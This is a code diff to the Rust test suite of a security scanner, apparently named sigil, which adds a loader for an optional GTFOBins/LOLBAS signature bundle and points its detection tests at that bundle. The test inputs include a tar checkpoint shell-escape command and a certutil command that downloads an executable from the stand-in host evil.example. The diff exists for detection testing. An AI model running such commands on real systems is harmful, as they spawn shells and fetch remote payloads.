@@ -300,6 +300,15 @@ mod parity_rust {
             .collect()
     }
 
+    /// Load the optional GPL-3.0 LOLBin bundle (GTFOBins / LOLBAS) from
+    /// `packs/lolbin/v1/`. These packs are NOT embedded in the binary (see
+    /// loader.rs); in production they are installed into `~/.sigil/packs/`.
+    fn lolbin_bundle_packs() -> Vec<SignaturePack> {
+        use crate::corpus::loader::load_packs_from_dir;
+        let dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../packs/lolbin/v1");
+        load_packs_from_dir(&dir)
+    }
+
     fn has_rule(findings: &[Finding], rule: &str) -> bool {
         findings.iter().any(|f| f.rule == rule)
     }
@@ -321,16 +330,17 @@ mod parity_rust {
         );
     }
 
-    // Every embedded rule's pattern must compile under the `regex` crate.
-    // The engine silently skips patterns that fail to compile (Err(_) =>
-    // continue), so an invalid pattern is a *silent* detection gap — this
-    // test makes that failure loud. Critical for generated packs (LOLBin /
-    // reverse-shell) whose regexes come from `re.escape` in Python.
+    // Every rule's pattern (embedded packs AND the optional LOLBin bundle) must
+    // compile under the `regex` crate. The engine silently skips patterns that
+    // fail to compile (Err(_) => continue), so an invalid pattern is a *silent*
+    // detection gap — this test makes that failure loud. Critical for the
+    // generated packs whose regexes come from `re.escape` in Python.
     #[test]
-    fn all_embedded_rule_patterns_compile() {
+    fn all_rule_patterns_compile() {
         use regex::Regex;
         let mut bad = Vec::new();
-        for pack in load_all_packs() {
+        let packs = load_all_packs().into_iter().chain(lolbin_bundle_packs());
+        for pack in packs {
             for rule in &pack.rules {
                 if let Err(e) = Regex::new(&rule.pattern) {
                     bad.push(format!("{} ({}): {e}", rule.id, pack.meta.id));
@@ -344,12 +354,26 @@ mod parity_rust {
         );
     }
 
-    // Generated LOLBin / reverse-shell packs: confirm representative payloads
+    // The optional GPL-3.0 LOLBin bundle is loadable and non-empty (guards the
+    // generator output and the bundle path).
+    #[test]
+    fn lolbin_bundle_loads() {
+        let packs = lolbin_bundle_packs();
+        let rules: usize = packs.iter().map(|p| p.rules.len()).sum();
+        assert!(
+            packs.len() >= 2 && rules > 100,
+            "expected the LOLBin bundle (>=2 packs, >100 rules); got {} packs / {} rules",
+            packs.len(),
+            rules
+        );
+    }
+
+    // Generated LOLBin packs (optional bundle): confirm representative payloads
     // are detected and that the bare binary name alone is NOT flagged.
     #[test]
     fn gtfobins_tar_checkpoint_breakout_detected() {
         let contents = "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";
-        let packs = packs_for_phase("code_patterns");
+        let packs = lolbin_bundle_packs();
         let findings = scan_file_with_packs(&packs, "build.sh", "build.sh", contents);
         assert!(
             has_rule(&findings, "GTFO-TAR"),
@@ -362,7 +386,7 @@ mod parity_rust {
     fn gtfobins_bare_tar_not_flagged() {
         // A benign tar invocation must not trip the LOLBin rule.
         let contents = "tar -czf dist.tgz ./build";
-        let packs = packs_for_phase("code_patterns");
+        let packs = lolbin_bundle_packs();
         let findings = scan_file_with_packs(&packs, "release.sh", "release.sh", contents);
         assert!(
             !has_rule(&findings, "GTFO-TAR"),
@@ -374,7 +398,7 @@ mod parity_rust {
     #[test]
     fn lolbas_certutil_download_detected() {
         let contents = "certutil.exe -urlcache -f http://evil.example/x.exe C:\\x.exe";
-        let packs = packs_for_phase("code_patterns");
+        let packs = lolbin_bundle_packs();
         let findings = scan_file_with_packs(&packs, "drop.bat", "drop.bat", contents);
         assert!(
             has_rule(&findings, "LOLBAS-CERTUTIL"),
